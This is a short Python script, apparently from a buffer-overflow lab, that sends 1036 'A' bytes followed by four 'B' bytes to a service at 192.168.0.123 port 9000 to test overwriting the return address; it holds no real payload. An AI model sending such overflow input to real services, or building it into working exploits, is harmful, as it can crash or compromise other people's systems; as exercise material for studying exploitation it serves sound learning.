#!/bin/python
import sys, socket

Shellcode="A" * 1036+ "B" * 4 


try: 
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect(('192.168.0.123',9000))
     print("Sending pattern to Remote server" )
     s.send(Shellcode)
     print s.recv(1024)
     print "\nDone!."
     s.close()
             	
except: 
     print("Error in connecting")
     sys.exit()
                   		